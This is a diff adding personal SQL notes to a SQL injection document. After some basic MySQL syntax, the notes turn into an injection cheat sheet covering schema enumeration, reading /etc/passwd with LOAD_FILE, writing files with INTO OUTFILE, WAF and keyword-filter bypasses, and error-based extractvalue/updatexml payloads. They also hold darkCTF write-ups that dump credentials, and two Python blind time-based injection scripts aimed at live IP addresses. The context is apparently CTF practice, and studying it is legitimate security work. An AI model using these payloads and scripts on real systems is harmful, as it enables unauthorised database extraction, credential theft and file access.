@@ -262,6 +262,512 @@ TRUE: `if @@version starts with a 5`:
 
 ```sql
 2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+
+
+1)describe <table_name> # to see the structure of a table
+2)import in cli# mysql -u Username -p dbNameYouWant < databasename_backup.sql;
+3)export in clie #mysqldump -u Username -p dbNameYouWant > databasename_backup.sql
+4)SHOW CREATE TABLE <table>; #to see the query which was used to create that table with all the structure and stuff
+5)SHOW PROCESSLIST; KILL process_number; # show and kill proccess
+6)SELECT * FROM table1, table2; # select rows from multiple tables
+7)SELECT COUNT(column_name)
+FROM table_name
+WHERE condition;
+#to return the count of number of entries in a column
+same way we can do avg and sum and min and max as well
+
+8)% - The percent sign represents zero, one, or multiple characters
+_ - The underscore represents a single character
+
+this is used for like statement
+ex:WHERE CustomerName LIKE '_r%'	Finds any values that have "r" in the second position
+h[^oa]t finds hit, but not hot and hat
+c[a-b]t finds cat and cbt
+
+9)SELECT * FROM Customers
+WHERE Country IN ('Germany', 'France', 'UK');
+SELECT * FROM Customers
+WHERE Country NOT IN ('Germany', 'France', 'UK');
+
+#in and not in just like python check if these values in the that columnn and displays only them
+
+10)SELECT * FROM Products
+WHERE Price BETWEEN 10 AND 20; # if  the price is between that range select only those rows
+SELECT * FROM Products
+WHERE Price NOT BETWEEN 10 AND 20;
+
+11)get rows from two tables like this use aliases to make it shorter and easier
+SELECT u.*,p.price from users as u,products as p WHERE u.name = 'Amy' AND p.price = 10000
+
+12) inner join to get common
+SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDate
+FROM Orders
+INNER JOIN Customers ON Orders.CustomerID=Customers.CustomerID;
+
+13)(INNER) JOIN: Returns records that have matching values in both tables
+LEFT (OUTER) JOIN: Returns all records from the left table, and the matched records from the right table
+RIGHT (OUTER) JOIN: Returns all records from the right table, and the matched records from the left table
+FULL (OUTER) JOIN: Returns all records when there is a match in either left or right table
+
+14)left join:
+SELECT Customers.CustomerName, Orders.OrderID
+FROM Customers
+LEFT JOIN Orders ON Customers.CustomerID = Orders.CustomerID
+ORDER BY Customers.CustomerName;
+
+select all entried from customer table and displays any order they have
+
+15)to get all tables
+select * from users where name = 'Amy' UNION select 1,`TABLE_NAME`,3 from `information_schema`.`TABLES` WHERE `TABLE_SCHEMA` = 'testingfrompython' # can write last part as database() also
+
+16)select * from users where name = 'Amy' UNION select id,name,price from `products` basic union query
+
+17)SELECT COUNT(*) FROM `users` WHERE `name` = 'sdadadas' OR substring(column_name of the table in the query) = '1'
+while doing substring attack always enclose substring in () like so (substring('hello',1,1)) = 'h'
+
+
+this is syntax for substring in mysql
+
+18)SELECT COUNT(CustomerID), Country
+FROM Customers
+GROUP BY Country;
+
+displays count of each country
+
+The following SQL statement lists the number of orders sent by each shipper:
+
+Example
+SELECT Shippers.ShipperName, COUNT(Orders.OrderID) AS NumberOfOrders FROM Orders
+LEFT JOIN Shippers ON Orders.ShipperID = Shippers.ShipperID
+GROUP BY ShipperName;
+
+19)	SELECT COUNT(CustomerID), Country
+FROM Customers
+GROUP BY Country
+HAVING COUNT(CustomerID) > 5;
+
+having is a like another condition checker similar to where
+
+20)
+SELECT SupplierName
+FROM Suppliers
+WHERE EXISTS (SELECT ProductName FROM Products WHERE Products.SupplierID = Suppliers.supplierID AND Price = 22);
+
+this is how we use the exists command
+
+21)SELECT * from users LIMIT <which entry to show starts from 0>,<how many entries show>
+
+SQL Injection Syntax Cheatsheet
+John Hammond
+
+Leak all of the database names as a string
+SELECT GROUP_CONCAT( SCHEMA_NAME ) FROM INFORMATION_SCHEMA.SCHEMATA
+
+Leak all of the tables in one database as a string
+SELECT GROUP_CONCAT( TABLE_NAME ) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="<DATABASE_NAME>"
+TO DO THIS FOR SQLite:
+
+SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'
+
+Leak the column names of a table as a string
+
+SELECT GROUP_CONCAT( COLUMN_NAME ) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="<TABLE NAME>"
+TO LEAK THE WHOLE SCHEMA OF A TABLE IN SQLITE:
+
+SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table'
+
+Leak the ONE column from a table
+SELECT GROUP_CONCAT( "<COLUMN_NAME>" ) FROM "<TABLE NAME>"
+IF THIS DOES NOT WORK, TRY WITHOUT THE QUOTES!!
+
+In-line Conditions (an if statement)
+SELECT "value" CASE WHEN condition>0 THEN 'return this' ELSE 'return instead' END
+This may be best used with timing attacks, like SLEEP(1) as the else condition action. Other option might be:
+
+SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )
+Get the path of the running MySQL instance
+SELECT @@datadir
+Get the version of the running MySQL instance
+SELECT @@version
+Get current user
+SELECT user();
+SELECT system_user();
+Read a file
+SELECT LOAD_FILE("/etc/passwd");
+Etcetera..
+Some applications try to replace keywords with an empty string. If this is the case, try and trick it by placing the keyword inside of itself. This is devious!
+
+frfromom => from
+oorr => or
+loaload_filed_file => load_file
+selselectect => select
+
+
+23)
+Variable/function	Output
+user()	Current User
+database()	Current Database
+version()	Database Version
+schema()	Current Database
+UUID()	System UUID Key
+current_user()	Current User
+system_user()	Current System User
+session_user()	Session User
+@@hostname	Current Hostname
+@@tmpdir	Temporary Directory
+@@datadir	Data Directory
+@@version	Version of Database
+@@basedir	Base Directory
+@@GLOBAL.have_symlink	Check if the symlink is Enabled or Disabled
+@@GLOBAL.have_ssl	Check if it SSL is available
+
+
+24)multiple group_concats are possible seperated by a comma if only 1 row being displayed use limit 1,1 then limit 2,1 like that
+if the first row being displayed from union and only limit 1 the give invalid input so that our union row will be displayed
+
+
+
+25)http://localhost:81/sqli/Less-8/?id=1' AND (length(database())) = 1 --+   length is also a function make sure to wrap it around ()
+
+26)another name for substring is substr and (ascii) also can be used like so
+
+
+http://localhost:81/sqli/Less-8/?id=1' AND (ascii(substr((select database()),1,1))) > 100 --+
+
+everything has to be in ()
+
+for ex: for ascii or for using select in substring or length or anything
+
+(select database())
+
+(ascii((substring((select database()),1,1)))
+
+the same for length and ascii and substring and substr or anyother our select statements have to be enclosed in ()
+
+if you do not know the database just use database() everywhere for information scheme or anything
+
+when selecting table_name from database from information_scheme check LIMIT 0,1 then LIMIT 1,1 to get all table names
+
+to check user privilages for current_user()
+
+SHOW GRANTS FOR 'root'@'localhost'
+
+
+replacement for or and and is
+
+AND :   &&   %26%26 
+
+OR: || 
+
+try this for comments --+
+
+if only union select does not work add or 1=1 after union select but make the select before union select bogus if only 1 row is being displayed
+
+bypass spaces in sql Blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’ ‘%a0’)
+
+we can also bypass by using comments like so 1'/**/or/**/1=1#
+
+this to enumerate number of rows in users table
+
+select * from users where id = 56 or (1=(select count(1) from users where id = 1))
+or 
+select * from users where id = 56 or (IF((SELECT count(1) from users where id =1)=1,1,0))
+
+this is another way to check for condition
+
+General select syntax:
+
+UniOn selEct [number of columns] [comment]
+
+ex:
+union select 1,2,3,4,5
+
+Examples:
+We will assume that there are 2 columns and comlumn 2 can be used to display data on screen.
+
+Seleting database version:
+UniOn selEct 1,version() /*
+
+Database:
+UniOn selEct 1,database() /*
+
+Database user:
+UniOn selEct 1,user() /*
+
+Database tables:
+UniOn selEct 1,table_name frOm information_schema.tables where table_schema = '[database name]' /*
+
+Table Columns:
+UniOn selEct 1,column_name frOm information_schema.columns where table_name = '[table name]' /*
+
+Selecting data from table:
+UniOn selEct 1,[column name] frOm [table name] /*
+
+Reading files:
+UniOn selEct 1,load_file('file location') /*
+
+Writing files:
+UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
+
+
+instead of using union + select in plain text if website using some kinf of waf you can use multi line comments
+
+
+/?id=1+un/**/ion+sel/**/ect+1,2,3--
+
+some sql injection waf bypass tips and tricks
+
+SELECT * from users where id = -1 un/*!*/ion sel/*!*/ect database(),version(),substr((SELECT age from users LIMIT 2,1),1,10)
+
+capitalize in some wafs
+
+www.[site].com/index.php?id=-1+UnIoN+SeLeCt+1,2,3,4--+-
+
+So what's the solution for this problem ?
+Well we can use SQL special comments, they start with /*! instead of only /* and that's great because in the second query, the input is already a comment, we just need to prepend the input with !. But first what does these special comments do ?
+
+A query that looks like this
+
+SELECT secret FROM top_secrets /*! WHERE id=1 */
+is EXACTLY equivalent to
+
+SELECT secret FROM top_secrets WHERE id=1
+It's as if there was no comment at ALL, amazing right ?
+
+
+there is a sql space trick
+
+suppose the max length of a column is 10
+
+if you give the name of an entry that already exists and give spaced and fill out the max chars with anything and register with a password
+
+when you login it will login with the present entry also for more details watch natas level 27 walkthrough john hammond
+
+' or extractvalue(1,concat(0x7e,database())) or '1'='1';--+
+
+# Source
+
+```
+> Don't know source is helpful or not !!
+
+> Write-up : Change User Agent As 9e9
+
+> category : web
+
+> Flag : darkCTF{changeing_http_user_agent_is_easy}
+
+```
+
+# Simple SQL
+
+```
+> Try to find username and password
+
+> Write-up : http://<ip>/index.php?id=5
+
+> category : web
+
+> Flag : darkCTF{it_is_very_easy_to_find}
+
+```
+
+# So_Simple
+
+```
+>  "Try Harder" may be You get flag manually
+
+> Write-up : 1.) -1' union select 1,(select database()),'3
+			 2.) -1' union select 1,(select group_concat(schema_name) from information_schema.schemata),'3
+			 3.) -1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security'),'3
+			 4.) -1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and          table_name='users'),'3
+			 5.) -1' union select 1,(select group_concat(username,0x3a,password) from users),'3
+
+> category : web
+
+> Flag : darkCTF{uniqu3_ide4_t0_find_fl4g}
+
+```
+
+# Agent U
+
+```
+>  Agent U Steal Database from my company but don't know which one can u help me to find flag format darkCTF{databasename}
+
+> Write-up : Change Default User-Agent To "' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1"
+
+> category : web
+
+> Flag : darkCTF{ag3nt_u_1s_v3ry_t3l3nt3d}
+
+```
+# Safe House
+
+```
+> Agent xer is hiding some information in secure safe, you have to get that information from him !!
+
+> Write-up : 1.) ?xer=1' || extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
+			 2.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(schema_name) from infoorrmation_schema.schemata),0x7e))--+
+			 3.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema='agentxer'),0x7e))--+ 
+			 4.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(column_name) from infoorrmation_schema.columns where table_schema='agentxer' aandnd table_name='referers'),0x7e))--+
+			 5.) ?xer=1' || extractvalue(1,concat(0x7e,(select group_concat(referer) from referers),0x7e))--+
+
+> category : web
+
+> Flag : darkCTF{S3cur3_s4f3_h0us3}
+
+```
+
+
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
+
+ExtractValue('xmldatahere', 'xpathqueryhere')
+
+XPATH syntax error: 'xpathqueryhere'
+
+always use group_concat
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(OUR QUERY HERE)))--
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select database())))--
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)))--
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username) from users)))--
+
+
+www.vuln-web.com/index.php?view=-35" and extractvalue(0x0a,concat(0x0a,(select count(username,0x3a,password) from users limit 0,1)))--
+
+as you can see i used limit as we cannot extract long data which limits upto 32 characters. So i prefer :P to go one by one increasing the row to get the output. well if you want to dump the database go for any tool or manual proxy else create your own script to get the data dumped for you which I prefer to be the best option.
+
+You can use SUBSTRING(fieldname,31,31) in order to extract the next 31 characters.
+You need to run your injection twice (or as many times as needed) in order to extract the entire value of the field.
+
+AND extractvalue(rand(),concat(0x3a,(SELECT SUBSTRING(fieldname,1,30) FROM tablename LIMIT 0,1)))--
+
+Change 0,30 to 31,30 to get the next 31 characters. You can keep adding 31 (31,62,etc) until you get a single ":" as an answer
+
+we can do select sleep(5); in sql this will sleep this also used for blind injection
+where username like a% and select sleep(5);
+
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html
+
+and updatexml(null,concat(0x0a,query),null) -- -
+
+payload = "00' UNION select 1,2, extractvalue(1,concat(0x3a,(select referer from referers))) -- "
+#payload = "%00%0a' UNION select 1,2, extractvalue(1,concat(0x3a,(select COLUMN_NAME from infoorrmation_schema.COLUMNS WHERE TABLE_SCHEMA = \"agentxer\" && TABLE_NAME = \"referers\" LIMIT 1,1))) -- "
+#payload = "%00%0a' UNION select 1,2, extractvalue(1,concat(0x3a,(select TABLE_NAME from infoorrmation_schema.TABLES WHERE TABLE_SCHEMA = \"agentxer\" LIMIT 0,1))) -- "
+
+select id,username from users where id = '1' union select 1,extractvalue(null,concat(0x0a,database())) -- -                    '
+
+
+
+This challenge the `filters` parm have the sql injection 
+
+sql injection in order by clause
+
+payload:   data = {'filters':'if(ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()),'+str(i)+',1))='+str(j)+',sleep(1),1)'}
+
+
+import requests
+import time
+
+header = {'Cookie':'PHPSESSID=621i7cn3m8ibhv3or2cgf9rblh'}
+flag = 'pineapple,pixels,doors,flowers,fusion,'
+for i in range(len(flag)+1,300):
+    for j in range(32,127):
+        t1 = time.time()
+        data = {'filters':'if(ord(substr((select/**/group_concat(name)/**/from/**/products),'+str(i)+',1))='+str(j)+',sleep(1),1)'}
+        conn = requests.post('http://65.0.4.132/home.php',data=data, headers=header)
+        r1 = conn.text
+        #print r1
+        t2 = time.time()
+        #print t2-t1, j
+        if t2-t1 > 1:
+            flag += chr(j)
+            print flag
+            break
+
+import requests as r
+
+url = 'http://65.0.54.62/home.php'
+cookie={'PHPSESSID':'d84q2cg0st4ugafitta6o59lc5'}
+
+#table length extraction
+print('Starting length extraction: \r\n')
+for i in range(1,20):
+    #print(' currentlength '+str(i))
+    payload='1,(select/**/if(((select/**/length(group_concat(table_name))/**/from/**/information_schema.tables/**/where/**/table_schema=database())='+str(i)+'),NULL,sleep(1)))'
+    res = r.post(url,cookies=cookie,data={'filters':payload})
+    if(res.elapsed.total_seconds()<4.00):
+        tabllength = i
+        print('Length of the tables concatenated:'+str(i))
+        #print(res.text)
+        print(res.elapsed.total_seconds())
+        break
+
+
+print('starting table name extraction: \r\n')
+tablename=''
+for i in range(1,tabllength+1):
+    for j in range(97,122):
+        #print(str(i)+' '+chr(j))
+        payload='1,(select/**/if((substring((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),'+str(i)+',1)=unhex(hex('+str(j)+'))),NULL,sleep(1)));'
+        res = r.post(url,cookies=cookie,data={'filters':payload})
+        if(res.elapsed.total_seconds()<4.00):
+            tablename = tablename+chr(j)
+            break
+print(tablename)
+
+print('starting column length extraction: \r\n')
+for i in range(10,25):
+    #print('curr column length: '+str(i))
+    payload='1,(select/**/if(((select/**/length(group_concat(column_name))/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36)))))='+str(i)+'),NULL,sleep(1)));'
+    res = r.post(url,cookies=cookie,data={'filters':payload})
+    if(res.elapsed.total_seconds()<4.00):
+        collength = i
+        print('Length of the columns concatenated: '+str(i))
+        #print(res.text)
+        break
+
+print('starting column names extraction: ')
+colname=''
+for i in range(1,collength+1):
+    for j in range(97,122):
+        #print(str(i)+' '+chr(j))
+        payload='1,(select/**/if(((substring((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=(concat(lower(conv(25,10,36)),lower(conv(27,10,36)),lower(conv(24,10,36)),lower(conv(13,10,36)),lower(conv(30,10,36)),lower(conv(12,10,36)),lower(conv(29,10,36)),lower(conv(28,10,36))))),'+str(i)+',1))=unhex(hex('+str(j)+'))),NULL,sleep(1)))'
+        res = r.post(url,cookies=cookie,data={'filters':payload})
+        if(res.elapsed.total_seconds()<4.00):
+            colname = colname+chr(j)
+            break
+print('concatenated column names: '+ colname)
+
+print('Starting to extract flag length: ')
+for i in range(30,50):
+    #print('curr flag length: '+str(i))
+    payload = '1,(select/**/if((length((select/**/name/**/from/**/products/**/where/**/exclusive=1))='+str(i)+'),NULL,sleep(1)));'
+    res = r.post(url,cookies=cookie,data={'filters':payload})
+    if(res.elapsed.total_seconds()<4.00):
+        flaglength = i
+        print('Length of the flag: '+str(i))
+        #print(res.text)
+        break
+print('starting to extract flag: ')
+flag=''
+for i in range(1,36) :
+    for j in range(48,126):
+        #print(str(i)+' '+chr(j))
+        payload='1,(select/**/if(((hex(substring((select/**/name/**/from/**/products/**/where/**/exclusive=1),'+str(i)+',1)))=hex('+str(j)+')),NULL,sleep(1)));'
+        res = r.post(url,cookies=cookie,data={'filters':payload})
+        if(res.elapsed.total_seconds()<4.00):
+            flag = flag+chr(j)
+            #print(flag)
+            break
+print('Flag: '+ flag)
+
 Response:
 HTTP/1.1 500 Internal Server Error
 ```
